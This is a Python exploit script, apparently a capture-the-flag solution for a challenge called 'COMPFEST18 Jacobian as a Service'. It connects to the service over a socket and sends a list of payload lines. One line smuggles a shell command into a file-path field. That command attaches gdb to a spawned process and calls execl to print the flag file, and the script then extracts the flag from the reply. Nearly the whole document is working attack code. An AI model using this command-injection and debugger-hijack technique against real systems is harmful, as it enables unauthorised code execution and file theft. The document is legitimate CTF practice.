#!/usr/bin/env python3
import argparse
import re
import socket
import sys
import time

PAYLOAD_LINES = [
    "2",
    "/opt/ctf/cysignals-CSI",
    "/home/ctf/tes & p=$!; sleep 0.5; /usr/bin/gdb -q -nx -p $p -batch -ex 'b pause' -ex 'signal 0' -ex 'call (int)execl(\"/bin/cat\",\"cat\",\"/home/ctf/flag.txt\",(char*)0)' 2>&1",
    "1",
    "11",
    "0*x+0*y+3",
]

FLAG_RE = re.compile(rb"COMPFEST18\{[^}\r\n]+\}")


def recv_some(sock: socket.socket, timeout: float = 0.25) -> bytes:
    sock.setblocking(False)
    end = time.time() + timeout
    chunks = []
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            time.sleep(0.02)
            continue
        if not chunk:
            break
        chunks.append(chunk)
        end = time.time() + timeout
    sock.setblocking(True)
    return b"".join(chunks)


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit sender for COMPFEST18 Jacobian as a Service")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--token", help="optional CTFd access token for remote instances")
    parser.add_argument("--delay", type=float, default=0.15, help="delay between sent lines")
    args = parser.parse_args()

    with socket.create_connection((args.host, args.port), timeout=10) as sock:
        sock.settimeout(10)
        out = recv_some(sock, 1.0)
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()

        if args.token:
            sock.sendall(args.token.encode() + b"\n")
            time.sleep(args.delay)
            out = recv_some(sock, 0.5)
            sys.stdout.buffer.write(out)
            sys.stdout.buffer.flush()

        for line in PAYLOAD_LINES:
            sock.sendall(line.encode() + b"\n")
            time.sleep(args.delay)
            out = recv_some(sock, 0.5)
            sys.stdout.buffer.write(out)
            sys.stdout.buffer.flush()

        transcript = bytearray()
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            transcript.extend(chunk)
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()

    match = FLAG_RE.search(bytes(transcript))
    if match:
        print("\n[+] flag:", match.group(0).decode())
        return 0

    print("\n[-] flag was not found in the final transcript")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
